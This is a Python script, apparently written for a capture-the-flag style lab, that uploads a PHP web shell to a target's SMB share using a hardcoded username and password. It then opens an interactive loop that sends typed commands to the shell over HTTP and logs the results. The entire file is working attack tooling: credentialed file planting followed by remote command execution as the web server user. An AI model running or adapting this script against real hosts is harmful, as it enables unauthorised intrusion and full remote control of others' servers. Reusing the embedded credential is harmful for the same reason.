# WebShellRepl.py

# scaffold:
# send curl "http://10.129.6.180:8808/webshell.php?cmd=dir"
# print output
# read - eval - print - loop


import requests
import sys
import os
import datetime

# Configuration
TARGET_IP = "10.129.7.134"
PORT = "8808"
SHELL_PATH = "webshell.php"
URL = f"http://{TARGET_IP}:{PORT}/{SHELL_PATH}"

# setup web shell
os.system(f'''smbclient '//{TARGET_IP}/new-site' -U 'tyler' --password '92g!mA8BGjOirkL%OG*&' -c 'put ./webshell.php webshell.php' ''')

def shell_repl():
    print(f"[*] Connecting to web shell at: {URL}")
    print("[*] Type 'exit' or 'quit' to stop the loop.\n")

    try:
        # Quick check to see if the shell is alive
        check = requests.get(URL, params={'cmd': 'echo Alive'}, timeout=5)
        if "Alive" not in check.text:
            print("[!] Warning: Shell did not respond as expected.")
    except requests.exceptions.ConnectionError:
        print("[!] Connection refused. Is the port open?")
        return

    while True:
        try:
            # READ: Get input from the user
            cmd = input(f"\033[91mwww-data@{TARGET_IP}\033[0m > ")

            if cmd.lower() in ['exit', 'quit']:
                print("[*] Exiting...")
                break

            if not cmd.strip():
                continue

            # EVAL: Send the HTTP GET request
            # We use params={'cmd': cmd} so requests handles URL encoding (e.g., spaces become %20)
            response = requests.get(URL, params={'cmd': cmd}, timeout=10)

            # PRINT: Show the output
            # We strip trailing whitespace to clean up the look, but keep internal formatting
            final_data=(response.text.strip())

            # <pre></pre> removal. hacky pos-based but works
            final_data = final_data[5:-6]
            print(final_data)

            # log to file
            with open('webshell_output.txt', 'a') as f:
                f.write(f"{datetime.datetime.now()} - {cmd}\n")
                f.write(final_data + '\n\n')

        except KeyboardInterrupt:
            print("\n[*] Interrupted by user. Exiting...")
            break
        except Exception as e:
            print(f"[!] An error occurred: {e}")

if __name__ == "__main__":
    shell_repl()
